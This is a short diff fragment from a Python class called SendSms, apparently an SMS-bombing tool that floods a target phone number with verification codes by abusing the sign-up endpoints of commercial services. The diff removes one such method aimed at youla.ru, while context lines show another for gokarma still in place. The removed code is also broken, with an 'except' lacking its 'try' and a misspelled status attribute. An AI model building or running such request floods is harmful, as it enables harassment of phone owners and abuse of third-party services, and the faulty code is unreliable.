@@ -2439,17 +2439,3 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app")
     
-    #youla
-    def youla(self):
-        url = "https://youla.ru/web-api/auth/request_code"
-        json={"deviceId": "31", "language": "tr-TR", "phoneNumber": f"90{self.phone}", "type": "REGISTER"}
-        r = requests.post(url,  json=json)
-        if r.status.code == 201:
-            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.youla.app")
-            self.adet += 1
-        else:
-            raise
-        
-    except:
-        print("Failed.")
-    
